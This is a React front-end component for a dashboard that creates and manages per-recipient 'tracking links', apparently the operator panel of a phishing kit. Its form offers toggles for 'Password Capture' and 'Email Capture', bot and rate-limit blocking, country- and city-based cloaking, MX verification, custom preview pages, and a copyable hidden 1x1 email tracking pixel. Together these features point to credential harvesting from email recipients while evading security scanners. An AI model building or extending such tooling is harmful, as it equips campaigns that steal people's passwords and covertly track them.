import React, { useState, useEffect } from 'react';
import { Plus, Copy, Eye, Trash2, Settings, Globe, Shield, Filter, Search, Download, MousePointerClick, Users, Bot, Edit, RefreshCw } from 'lucide-react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';

const TrackingLinks = () => {
  const [links, setLinks] = useState([]);
  const [campaigns, setCampaigns] = useState([]);
  const [showCreateForm, setShowCreateForm] = useState(false);
  const [showEditForm, setShowEditForm] = useState(false);
  const [editingLink, setEditingLink] = useState(null);
  const [searchTerm, setSearchTerm] = useState('');
  const [selectedCampaign, setSelectedCampaign] = useState('');
  const [linkStats, setLinkStats] = useState({
    total_clicks: 0,
    real_visitors: 0,
    bot_blocked: 0,
  });
  const [formData, setFormData] = useState({
    target_url: '',
    campaign_id: '',
    recipient_email: '',
    
    // Security Features
    capture_email: false,
    capture_password: false,
    bot_blocking_enabled: true,
    rate_limiting_enabled: false,
    dynamic_signature_enabled: false,
    mx_verification_enabled: false,
    
    // Comprehensive Geolocation Filtering
    geo_targeting_enabled: false,
    geo_filter_mode: 'allow', // 'allow' or 'block'
    allowed_countries: '', // Comma-separated country codes
    blocked_countries: '', // Comma-separated country codes
    allowed_cities: '',    // Comma-separated city names
    blocked_cities: '',    // Comma-separated city names
    
    // Preview Settings
    custom_preview_enabled: false,
    preview_template_url: ''
  });

  const countryOptions = [
    { code: 'US', name: 'United States' },
    { code: 'CA', name: 'Canada' },
    { code: 'UK', name: 'United Kingdom' },
    { code: 'AU', name: 'Australia' },
    { code: 'DE', name: 'Germany' },
    { code: 'FR', name: 'France' },
    { code: 'JP', name: 'Japan' },
    { code: 'BR', name: 'Brazil' },
    { code: 'IN', name: 'India' },
    { code: 'CN', name: 'China' },
    { code: 'RU', name: 'Russia' },
    { code: 'MX', name: 'Mexico' },
    { code: 'IT', name: 'Italy' },
    { code: 'ES', name: 'Spain' },
    { code: 'NL', name: 'Netherlands' },
    { code: 'SE', name: 'Sweden' },
    { code: 'NO', name: 'Norway' },
    { code: 'DK', name: 'Denmark' },
    { code: 'FI', name: 'Finland' },
    { code: 'CH', name: 'Switzerland' }
  ];

  useEffect(() => {
    fetchLinks();
    fetchCampaigns();
    fetchLinkStats();
  }, []);

  const fetchLinks = async () => {
    try {
      const response = await fetch('/api/links');
      if (response.ok) {
        const data = await response.json();
        setLinks(data.links || []);
      }
    } catch (error) {
      console.error('Error fetching links:', error);
    }
  };

  const fetchCampaigns = async () => {
    try {
      const response = await fetch('/api/campaigns');
      if (response.ok) {
        const data = await response.json();
        setCampaigns(data.campaigns || []);
      }
    } catch (error) {
      console.error('Error fetching campaigns:', error);
    }
  };

  const fetchLinkStats = async () => {
    try {
      const response = await fetch('/api/link-stats'); // Assuming a new API endpoint for overall link stats
      if (response.ok) {
        const data = await response.json();
        setLinkStats(data);
      } else {
        console.error('Failed to fetch link stats:', response.statusText);
      }
    } catch (error) {
      console.error('Error fetching link stats:', error);
    }
  };

  const handleCreateLink = async (e) => {
    e.preventDefault();
    
    // Process geolocation data based on selected mode
    const processedData = {
      ...formData,
      allowed_countries: formData.geo_filter_mode === 'allow' && formData.allowed_countries ? 
        formData.allowed_countries.split(',').map(c => c.trim().toUpperCase()).filter(c => c) : [],
      blocked_countries: formData.geo_filter_mode === 'block' && formData.blocked_countries ? 
        formData.blocked_countries.split(',').map(c => c.trim().toUpperCase()).filter(c => c) : [],
      allowed_cities: formData.geo_filter_mode === 'allow' && formData.allowed_cities ? 
        formData.allowed_cities.split(',').map(c => c.trim()).filter(c => c) : [],
      blocked_cities: formData.geo_filter_mode === 'block' && formData.blocked_cities ? 
        formData.blocked_cities.split(',').map(c => c.trim()).filter(c => c) : []
    };

    try {
      const response = await fetch('/api/links', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(processedData),
      });

      if (response.ok) {
        const result = await response.json();
        setShowCreateForm(false);
        setFormData({
          target_url: '',
          campaign_id: '',
          recipient_email: '',
          capture_email: false,
          capture_password: false,
          bot_blocking_enabled: true,
          rate_limiting_enabled: false,
          dynamic_signature_enabled: false,
          mx_verification_enabled: false,
          geo_targeting_enabled: false,
          geo_filter_mode: 'allow',
          allowed_countries: '',
          blocked_countries: '',
          allowed_cities: '',
          blocked_cities: '',
          custom_preview_enabled: false,
          preview_template_url: ''
        });
        fetchLinks();
        fetchLinkStats(); // Refresh stats after creating a link
        alert('Tracking link created successfully!');
      } else {
        const error = await response.json();
        alert(`Error: ${error.error}`);
      }
    } catch (error) {
      console.error('Error creating link:', error);
      alert('Failed to create tracking link');
    }
  };

  const copyToClipboard = (text, type) => {
    navigator.clipboard.writeText(text);
    alert(`${type} copied to clipboard!`);
  };

  const editLink = (link) => {
    setEditingLink(link);
    setFormData({
      target_url: link.target_url,
      campaign_id: link.campaign_id || '',
      recipient_email: link.recipient_email || '',
      capture_email: link.capture_email,
      capture_password: link.capture_password,
      bot_blocking_enabled: link.bot_blocking_enabled,
      rate_limiting_enabled: link.rate_limiting_enabled,
      dynamic_signature_enabled: link.dynamic_signature_enabled || false,
      mx_verification_enabled: link.mx_verification_enabled || false,
      geo_targeting_enabled: link.geo_targeting_enabled,
      geo_filter_mode: 'allow',
      allowed_countries: link.allowed_countries ? link.allowed_countries.join(', ') : '',
      blocked_countries: link.blocked_countries ? link.blocked_countries.join(', ') : '',
      allowed_cities: link.allowed_cities ? link.allowed_cities.join(', ') : '',
      blocked_cities: link.blocked_cities ? link.blocked_cities.join(', ') : '',
      custom_preview_enabled: false,
      preview_template_url: ''
    });
    setShowEditForm(true);
  };

  const handleEditLink = async (e) => {
    e.preventDefault();
    
    if (!editingLink) return;

    const processedData = {
      ...formData,
      allowed_countries: formData.geo_filter_mode === 'allow' && formData.allowed_countries ? 
        formData.allowed_countries.split(',').map(c => c.trim().toUpperCase()).filter(c => c) : [],
      blocked_countries: formData.geo_filter_mode === 'block' && formData.blocked_countries ? 
        formData.blocked_countries.split(',').map(c => c.trim().toUpperCase()).filter(c => c) : [],
      allowed_cities: formData.geo_filter_mode === 'allow' && formData.allowed_cities ? 
        formData.allowed_cities.split(',').map(c => c.trim()).filter(c => c) : [],
      blocked_cities: formData.geo_filter_mode === 'block' && formData.blocked_cities ? 
        formData.blocked_cities.split(',').map(c => c.trim()).filter(c => c) : []
    };

    try {
      const response = await fetch(`/api/links/${editingLink.id}`, {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(processedData),
      });

      if (response.ok) {
        setShowEditForm(false);
        setEditingLink(null);
        setFormData({
          target_url: '',
          campaign_id: '',
          recipient_email: '',
          capture_email: false,
          capture_password: false,
          bot_blocking_enabled: true,
          rate_limiting_enabled: false,
          dynamic_signature_enabled: false,
          mx_verification_enabled: false,
          geo_targeting_enabled: false,
          geo_filter_mode: 'allow',
          allowed_countries: '',
          blocked_countries: '',
          allowed_cities: '',
          blocked_cities: '',
          custom_preview_enabled: false,
          preview_template_url: ''
        });
        fetchLinks();
        alert('Link updated successfully!');
      } else {
        const error = await response.json();
        alert(`Error: ${error.error}`);
      }
    } catch (error) {
      console.error('Error updating link:', error);
      alert('Failed to update link');
    }
  };

  const regenerateLink = async (linkId) => {
    if (!confirm('Are you sure you want to regenerate this link? The old URL will no longer work.')) {
      return;
    }

    try {
      const response = await fetch(`/api/links/${linkId}/regenerate`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
      });

      if (response.ok) {
        fetchLinks();
        alert('Link regenerated successfully!');
      } else {
        const error = await response.json();
        alert(`Error: ${error.error}`);
      }
    } catch (error) {
      console.error('Error regenerating link:', error);
      alert('Failed to regenerate link');
    }
  };

  const deleteLink = async (linkId) => {
    if (!confirm('Are you sure you want to delete this link? This will permanently remove all associated tracking data from the system, logs, and database.')) {
      return;
    }

    try {
      const response = await fetch('/api/links', {
        method: 'DELETE',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ id: linkId }),
      });

      if (response.ok) {
        fetchLinks();
        fetchLinkStats(); // Refresh stats after deleting a link
        alert('Link and all associated data deleted successfully');
      } else {
        alert('Failed to delete link');
      }
    } catch (error) {
      console.error('Error deleting link:', error);
      alert('Failed to delete link');
    }
  };

  const filteredLinks = links.filter(link => {
    const matchesSearch = link.target_url.toLowerCase().includes(searchTerm.toLowerCase()) ||
                         link.short_code.toLowerCase().includes(searchTerm.toLowerCase());
    const matchesCampaign = !selectedCampaign || link.campaign_id === parseInt(selectedCampaign);
    return matchesSearch && matchesCampaign;
  });

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
        <div>
          <h2 className="text-2xl font-bold text-white mb-2">Tracking Links</h2>
          <p className="text-gray-400">Manage and monitor all your tracking links</p>
        </div>
        <button
          onClick={() => setShowCreateForm(true)}
          className="flex items-center gap-2 bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded-lg transition-colors"
        >
          <Plus className="w-4 h-4" />
          Create New Link
        </button>
      </div>

      {/* Stats Cards */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
        <Card className="bg-slate-800/50 backdrop-blur-sm border-slate-700">
          <CardContent className="p-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-slate-400 text-sm font-medium">Total Clicks</p>
                <p className="text-2xl font-bold text-white mt-1">{linkStats.total_clicks}</p>
              </div>
              <div className="p-3 rounded-lg bg-blue-500/20">
                <MousePointerClick className="w-6 h-6 text-blue-400" />
              </div>
            </div>
          </CardContent>
        </Card>

        <Card className="bg-slate-800/50 backdrop-blur-sm border-slate-700">
          <CardContent className="p-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-slate-400 text-sm font-medium">Real Visitors</p>
                <p className="text-2xl font-bold text-white mt-1">{linkStats.real_visitors}</p>
              </div>
              <div className="p-3 rounded-lg bg-green-500/20">
                <Users className="w-6 h-6 text-green-400" />
              </div>
            </div>
          </CardContent>
        </Card>

        <Card className="bg-slate-800/50 backdrop-blur-sm border-slate-700">
          <CardContent className="p-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-slate-400 text-sm font-medium">Bot Blocked</p>
                <p className="text-2xl font-bold text-white mt-1">{linkStats.bot_blocked}</p>
              </div>
              <div className="p-3 rounded-lg bg-red-500/20">
                <Bot className="w-6 h-6 text-red-400" />
              </div>
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Search and Filter */}
      <div className="flex flex-col sm:flex-row gap-4">
        <div className="relative flex-1">
          <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4" />
          <input
            type="text"
            placeholder="Search links..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="w-full pl-10 pr-4 py-2 bg-gray-800 border border-gray-700 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500"
          />
        </div>
        <select
          value={selectedCampaign}
          onChange={(e) => setSelectedCampaign(e.target.value)}
          className="px-4 py-2 bg-gray-800 border border-gray-700 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
        >
          <option value="">All Campaigns</option>
          {campaigns.map(campaign => (
            <option key={campaign.id} value={campaign.id}>{campaign.name}</option>
          ))}
        </select>
      </div>

      {/* Links List */}
      <div className="space-y-4">
        {filteredLinks.map(link => (
          <div key={link.id} className="bg-gray-800 rounded-lg p-6 border border-gray-700">
            <div className="flex flex-col lg:flex-row justify-between items-start gap-4">
              <div className="flex-1 min-w-0">
                <div className="flex items-center gap-2 mb-2">
                  <h3 className="text-lg font-semibold text-white truncate">{link.target_url}</h3>
                  {link.campaign_name && (
                    <span className="px-2 py-1 bg-blue-600 text-white text-xs rounded">{link.campaign_name}</span>
                  )}
                </div>
                
                <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 mb-4">
                  <div className="flex items-center gap-2">
                    <Eye className="w-4 h-4 text-green-400" />
                    <span className="text-sm text-gray-300">{link.total_clicks} clicks</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <Globe className="w-4 h-4 text-blue-400" />
                    <span className="text-sm text-gray-300">{link.real_visitors} visitors</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <Shield className="w-4 h-4 text-red-400" />
                    <span className="text-sm text-gray-300">{link.blocked_attempts} blocked</span>
                  </div>
                </div>

                {/* Security Features Display */}
                <div className="flex flex-wrap gap-2 mb-4">
                  {link.bot_blocking_enabled && (
                    <span className="px-2 py-1 bg-green-600 text-white text-xs rounded">Bot Blocking</span>
                  )}
                  {link.geo_targeting_enabled && (
                    <span className="px-2 py-1 bg-purple-600 text-white text-xs rounded">Geo Targeting</span>
                  )}
                  {link.capture_email && (
                    <span className="px-2 py-1 bg-blue-600 text-white text-xs rounded">Email Capture</span>
                  )}
                  {link.rate_limiting_enabled && (
                    <span className="px-2 py-1 bg-orange-600 text-white text-xs rounded">Rate Limiting</span>
                  )}
                  {link.dynamic_signature_enabled && (
                    <span className="px-2 py-1 bg-indigo-600 text-white text-xs rounded">Dynamic Signature</span>
                  )}
                </div>

                {/* URLs */}
                <div className="space-y-2">
                  <div className="flex items-center gap-2">
                    <span className="text-sm text-gray-400 w-20">Tracking:</span>
                    <code className="flex-1 text-sm bg-gray-900 px-2 py-1 rounded text-green-400 truncate">
                      {link.tracking_url}
                    </code>
                    <button
                      onClick={() => copyToClipboard(link.tracking_url, 'Tracking URL')}
                      className="p-1 text-gray-400 hover:text-white transition-colors"
                    >
                      <Copy className="w-4 h-4" />
                    </button>
                  </div>
                  
                  <div className="flex items-center gap-2">
                    <span className="text-sm text-gray-400 w-20">Pixel:</span>
                    <code className="flex-1 text-sm bg-gray-900 px-2 py-1 rounded text-blue-400 truncate">
                      {link.pixel_url}
                    </code>
                    <button
                      onClick={() => copyToClipboard(link.pixel_url, 'Pixel URL')}
                      className="p-1 text-gray-400 hover:text-white transition-colors"
                    >
                      <Copy className="w-4 h-4" />
                    </button>
                  </div>

                  {/* Email Code */}
                  <div className="flex items-start gap-2">
                    <span className="text-sm text-gray-400 w-20 mt-1">Email:</span>
                    <code className="flex-1 text-sm bg-gray-900 px-2 py-1 rounded text-yellow-400">
                      {`<img src="${link.pixel_url}" width="1" height="1" style="display:none">`}
                    </code>
                    <button
                      onClick={() => copyToClipboard(`<img src="${link.pixel_url}" width="1" height="1" style="display:none">`, 'Email Code')}
                      className="p-1 text-gray-400 hover:text-white transition-colors"
                    >
                      <Copy className="w-4 h-4" />
                    </button>
                  </div>
                </div>
              </div>

              {/* Actions */}
              <div className="flex gap-2">
                <button
                  onClick={() => editLink(link)}
                  className="p-2 text-blue-400 hover:text-blue-300 hover:bg-blue-900/20 rounded transition-colors"
                  title="Edit Link"
                >
                  <Edit className="w-4 h-4" />
                </button>
                <button
                  onClick={() => regenerateLink(link.id)}
                  className="p-2 text-green-400 hover:text-green-300 hover:bg-green-900/20 rounded transition-colors"
                  title="Regenerate Link"
                >
                  <RefreshCw className="w-4 h-4" />
                </button>
                <button
                  onClick={() => deleteLink(link.id)}
                  className="p-2 text-red-400 hover:text-red-300 hover:bg-red-900/20 rounded transition-colors"
                  title="Delete Link"
                >
                  <Trash2 className="w-4 h-4" />
                </button>
              </div>
            </div>
          </div>
        ))}
      </div>

      {/* Create Link Modal */}
      {showCreateForm && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
          <div className="bg-gray-800 rounded-lg p-6 w-full max-w-2xl max-h-[90vh] overflow-y-auto">
            <div className="flex justify-between items-center mb-6">
              <h3 className="text-xl font-bold text-white">Create New Tracking Link</h3>
              <button
                onClick={() => setShowCreateForm(false)}
                className="text-gray-400 hover:text-white"
              >
                ×
              </button>
            </div>

            <form onSubmit={handleCreateLink} className="space-y-6">
              {/* Basic Settings */}
              <div className="space-y-4">
                <h4 className="text-lg font-semibold text-white">Basic Settings</h4>
                
                <div>
                  <label className="block text-sm font-medium text-gray-300 mb-2">
                    Target URL *
                  </label>
                  <input
                    type="url"
                    required
                    value={formData.target_url}
                    onChange={(e) => setFormData({...formData, target_url: e.target.value})}
                    placeholder="https://example.com/preview"
                    className="w-full px-3 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500"
                  />
                </div>

                <div>
                  <label className="block text-sm font-medium text-gray-300 mb-2">
                    Campaign (Optional)
                  </label>
                  <select
                    value={formData.campaign_id}
                    onChange={(e) => setFormData({...formData, campaign_id: e.target.value})}
                    className="w-full px-3 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
                  >
                    <option value="">Select Campaign</option>
                    {campaigns.map(campaign => (
                      <option key={campaign.id} value={campaign.id}>{campaign.name}</option>
                    ))}
                  </select>
                </div>

                <div>
                  <label className="block text-sm font-medium text-gray-300 mb-2">
                    Recipient Email (Optional)
                  </label>
                  <input
                    type="email"
                    value={formData.recipient_email}
                    onChange={(e) => setFormData({...formData, recipient_email: e.target.value})}
                    placeholder="recipient@example.com"
                    className="w-full px-3 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500"
                  />
                </div>
              </div>

              {/* Security Features */}
              <div className="space-y-4">
                <h4 className="text-lg font-semibold text-white">Security Features</h4>
                
                <div className="flex items-center justify-between">
                  <label htmlFor="capture_email" className="text-gray-300">Email Capture</label>
                  <input
                    type="checkbox"
                    id="capture_email"
                    checked={formData.capture_email}
                    onChange={(e) => setFormData({...formData, capture_email: e.target.checked})}
                    className="form-checkbox h-5 w-5 text-blue-600"
                  />
                </div>

                <div className="flex items-center justify-between">
                  <label htmlFor="capture_password" className="text-gray-300">Password Capture</label>
                  <input
                    type="checkbox"
                    id="capture_password"
                    checked={formData.capture_password}
                    onChange={(e) => setFormData({...formData, capture_password: e.target.checked})}
                    className="form-checkbox h-5 w-5 text-blue-600"
                  />
                </div>

                <div className="flex items-center justify-between">
                  <label htmlFor="bot_blocking_enabled" className="text-gray-300">Bot Blocking</label>
                  <input
                    type="checkbox"
                    id="bot_blocking_enabled"
                    checked={formData.bot_blocking_enabled}
                    onChange={(e) => setFormData({...formData, bot_blocking_enabled: e.target.checked})}
                    className="form-checkbox h-5 w-5 text-blue-600"
                  />
                </div>

                <div className="flex items-center justify-between">
                  <label htmlFor="rate_limiting_enabled" className="text-gray-300">Rate Limiting</label>
                  <input
                    type="checkbox"
                    id="rate_limiting_enabled"
                    checked={formData.rate_limiting_enabled}
                    onChange={(e) => setFormData({...formData, rate_limiting_enabled: e.target.checked})}
                    className="form-checkbox h-5 w-5 text-blue-600"
                  />
                </div>

                <div className="flex items-center justify-between">
                  <label htmlFor="dynamic_signature_enabled" className="text-gray-300">Dynamic Signature</label>
                  <input
                    type="checkbox"
                    id="dynamic_signature_enabled"
                    checked={formData.dynamic_signature_enabled}
                    onChange={(e) => setFormData({...formData, dynamic_signature_enabled: e.target.checked})}
                    className="form-checkbox h-5 w-5 text-blue-600"
                  />
                </div>

                <div className="flex items-center justify-between">
                  <label htmlFor="mx_verification_enabled" className="text-gray-300">MX Verification</label>
                  <input
                    type="checkbox"
                    id="mx_verification_enabled"
                    checked={formData.mx_verification_enabled}
                    onChange={(e) => setFormData({...formData, mx_verification_enabled: e.target.checked})}
                    className="form-checkbox h-5 w-5 text-blue-600"
                  />
                </div>

                {/* Geo Targeting */}
                <div className="space-y-4 border border-gray-700 p-4 rounded-lg">
                  <div className="flex items-center justify-between">
                    <label htmlFor="geo_targeting_enabled" className="text-gray-300">Geo Targeting</label>
                    <input
                      type="checkbox"
                      id="geo_targeting_enabled"
                      checked={formData.geo_targeting_enabled}
                      onChange={(e) => setFormData({...formData, geo_targeting_enabled: e.target.checked})}
                      className="form-checkbox h-5 w-5 text-blue-600"
                    />
                  </div>

                  {formData.geo_targeting_enabled && (
                    <div className="space-y-4">
                      <div>
                        <label className="block text-sm font-medium text-gray-300 mb-2">Filter Mode</label>
                        <select
                          value={formData.geo_filter_mode}
                          onChange={(e) => setFormData({...formData, geo_filter_mode: e.target.value})}
                          className="w-full px-3 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
                        >
                          <option value="allow">Allow Only (Whitelist)</option>
                          <option value="block">Block Only (Blacklist)</option>
                        </select>
                      </div>

                      {formData.geo_filter_mode === 'allow' && (
                        <div className="space-y-4">
                          <div>
                            <label className="block text-sm font-medium text-gray-300 mb-2">Allowed Countries (e.g., US, UK, CA)</label>
                            <input
                              type="text"
                              value={formData.allowed_countries}
                              onChange={(e) => setFormData({...formData, allowed_countries: e.target.value})}
                              placeholder="Comma-separated country codes"
                              className="w-full px-3 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500"
                            />
                          </div>
                          <div>
                            <label className="block text-sm font-medium text-gray-300 mb-2">Allowed Cities (e.g., New York, London)</label>
                            <input
                              type="text"
                              value={formData.allowed_cities}
                              onChange={(e) => setFormData({...formData, allowed_cities: e.target.value})}
                              placeholder="Comma-separated city names"
                              className="w-full px-3 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500"
                            />
                          </div>
                        </div>
                      )}

                      {formData.geo_filter_mode === 'block' && (
                        <div className="space-y-4">
                          <div>
                            <label className="block text-sm font-medium text-gray-300 mb-2">Blocked Countries (e.g., CN, RU, IR)</label>
                            <input
                              type="text"
                              value={formData.blocked_countries}
                              onChange={(e) => setFormData({...formData, blocked_countries: e.target.value})}
                              placeholder="Comma-separated country codes"
                              className="w-full px-3 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500"
                            />
                          </div>
                          <div>
                            <label className="block text-sm font-medium text-gray-300 mb-2">Blocked Cities (e.g., Beijing, Moscow)</label>
                            <input
                              type="text"
                              value={formData.blocked_cities}
                              onChange={(e) => setFormData({...formData, blocked_cities: e.target.value})}
                              placeholder="Comma-separated city names"
                              className="w-full px-3 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500"
                            />
                          </div>
                        </div>
                      )}
                    </div>
                  )}
                </div>
              </div>

              {/* Preview Settings */}
              <div className="space-y-4">
                <h4 className="text-lg font-semibold text-white">Preview Settings</h4>
                <div className="flex items-center justify-between">
                  <label htmlFor="custom_preview_enabled" className="text-gray-300">Custom Preview Page</label>
                  <input
                    type="checkbox"
                    id="custom_preview_enabled"
                    checked={formData.custom_preview_enabled}
                    onChange={(e) => setFormData({...formData, custom_preview_enabled: e.target.checked})}
                    className="form-checkbox h-5 w-5 text-blue-600"
                  />
                </div>
                {formData.custom_preview_enabled && (
                  <div>
                    <label className="block text-sm font-medium text-gray-300 mb-2">Preview Template URL</label>
                    <input
                      type="url"
                      value={formData.preview_template_url}
                      onChange={(e) => setFormData({...formData, preview_template_url: e.target.value})}
                      placeholder="https://example.com/preview"
                      className="w-full px-3 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500"
                    />
                  </div>
                )}
              </div>

              <div className="flex justify-end gap-4">
                <button
                  type="button"
                  onClick={() => setShowCreateForm(false)}
                  className="px-4 py-2 bg-gray-600 hover:bg-gray-700 text-white rounded-lg transition-colors"
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  className="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg transition-colors"
                >
                  Create Link
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* Edit Link Modal */}
      {showEditForm && editingLink && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
          <div className="bg-gray-800 rounded-lg p-6 w-full max-w-2xl max-h-[90vh] overflow-y-auto">
            <div className="flex justify-between items-center mb-6">
              <h3 className="text-xl font-bold text-white">Edit Tracking Link</h3>
              <button
                onClick={() => {
                  setShowEditForm(false);
                  setEditingLink(null);
                }}
                className="text-gray-400 hover:text-white"
              >
                ×
              </button>
            </div>

            <form onSubmit={handleEditLink} className="space-y-6">
              {/* Basic Settings */}
              <div className="space-y-4">
                <h4 className="text-lg font-semibold text-white">Basic Settings</h4>
                <div>
                  <label className="block text-sm font-medium text-gray-300 mb-2">Target URL *</label>
                  <input
                    type="url"
                    required
                    value={formData.target_url}
                    onChange={(e) => setFormData({...formData, target_url: e.target.value})}
                    placeholder="https://example.com"
                    className="w-full px-3 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500"
                  />
                </div>

                <div>
                  <label className="block text-sm font-medium text-gray-300 mb-2">Campaign</label>
                  <select
                    value={formData.campaign_id}
                    onChange={(e) => setFormData({...formData, campaign_id: e.target.value})}
                    className="w-full px-3 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
                  >
                    <option value="">No Campaign</option>
                    {campaigns.map(campaign => (
                      <option key={campaign.id} value={campaign.id}>{campaign.name}</option>
                    ))}
                  </select>
                </div>

                <div>
                  <label className="block text-sm font-medium text-gray-300 mb-2">Recipient Email (Optional)</label>
                  <input
                    type="email"
                    value={formData.recipient_email}
                    onChange={(e) => setFormData({...formData, recipient_email: e.target.value})}
                    placeholder="recipient@example.com"
                    className="w-full px-3 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500"
                  />
                </div>
              </div>

              {/* Security Features */}
              <div className="space-y-4">
                <h4 className="text-lg font-semibold text-white">Security Features</h4>
                
                <div className="flex items-center justify-between">
                  <label htmlFor="edit_capture_email" className="text-gray-300">Email Capture</label>
                  <input
                    type="checkbox"
                    id="edit_capture_email"
                    checked={formData.capture_email}
                    onChange={(e) => setFormData({...formData, capture_email: e.target.checked})}
                    className="form-checkbox h-5 w-5 text-blue-600"
                  />
                </div>

                <div className="flex items-center justify-between">
                  <label htmlFor="edit_capture_password" className="text-gray-300">Password Capture</label>
                  <input
                    type="checkbox"
                    id="edit_capture_password"
                    checked={formData.capture_password}
                    onChange={(e) => setFormData({...formData, capture_password: e.target.checked})}
                    className="form-checkbox h-5 w-5 text-blue-600"
                  />
                </div>

                <div className="flex items-center justify-between">
                  <label htmlFor="edit_bot_blocking_enabled" className="text-gray-300">Bot Blocking</label>
                  <input
                    type="checkbox"
                    id="edit_bot_blocking_enabled"
                    checked={formData.bot_blocking_enabled}
                    onChange={(e) => setFormData({...formData, bot_blocking_enabled: e.target.checked})}
                    className="form-checkbox h-5 w-5 text-blue-600"
                  />
                </div>

                <div className="flex items-center justify-between">
                  <label htmlFor="edit_geo_targeting_enabled" className="text-gray-300">Geo Targeting</label>
                  <input
                    type="checkbox"
                    id="edit_geo_targeting_enabled"
                    checked={formData.geo_targeting_enabled}
                    onChange={(e) => setFormData({...formData, geo_targeting_enabled: e.target.checked})}
                    className="form-checkbox h-5 w-5 text-blue-600"
                  />
                </div>
              </div>

              <div className="flex justify-end gap-4">
                <button
                  type="button"
                  onClick={() => {
                    setShowEditForm(false);
                    setEditingLink(null);
                  }}
                  className="px-4 py-2 bg-gray-600 hover:bg-gray-700 text-white rounded-lg transition-colors"
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  className="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg transition-colors"
                >
                  Update Link
                </button>
              </div>
            </form>
          </div>
        </div>
      )}
    </div>
  );
};

export { TrackingLinks };

